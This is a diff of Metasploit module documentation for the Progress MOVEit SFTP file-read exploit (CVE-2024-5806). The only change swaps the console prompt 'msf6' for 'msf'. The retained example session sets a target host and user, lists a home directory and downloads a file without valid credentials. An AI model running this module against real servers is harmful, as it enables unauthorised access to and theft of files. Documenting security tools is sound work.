@@ -54,13 +54,13 @@ what files you can read, you can first read the root directories (/) contents. (
 ### Default
 
 ```
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set RHOST 169.254.180.121
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set RHOST 169.254.180.121
 RHOST => 169.254.180.121
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set STORE_LOOT false
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set STORE_LOOT false
 STORE_LOOT => false
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set TARGETUSER testuser1
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > set TARGETUSER testuser1
 TARGETUSER => testuser1
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > show options
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > show options
 
 Module options (auxiliary/gather/progress_moveit_sftp_fileread_cve_2024_5806):
 
@@ -75,7 +75,7 @@ Module options (auxiliary/gather/progress_moveit_sftp_fileread_cve_2024_5806):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run
 [*] Running module against 169.254.180.121
 
 [*] Authenticating as: testuser1@169.254.180.121:22
@@ -85,12 +85,12 @@ dr-xr-xr-x 1 0 0 0 Jun 18 22:50 /Home/testuser1/
 dr-xr-xr-x 1 0 0 0 Jun 18 22:50 /Home/testuser1/TestFolder1/
 -rw-rw-rw- 1 0 0 8 Jun 18 22:50 /Home/testuser1/test.txt
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run TARGETFILE=/Home/testuser1/test.txt
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > run TARGETFILE=/Home/testuser1/test.txt
 [*] Running module against 169.254.180.121
 
 [*] Authenticating as: testuser1@169.254.180.121:22
 [*] Downloading file: /Home/testuser1/test.txt
 secrets!
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > 
+msf auxiliary(gather/progress_moveit_sftp_fileread_cve_2024_5806) > 
 ```
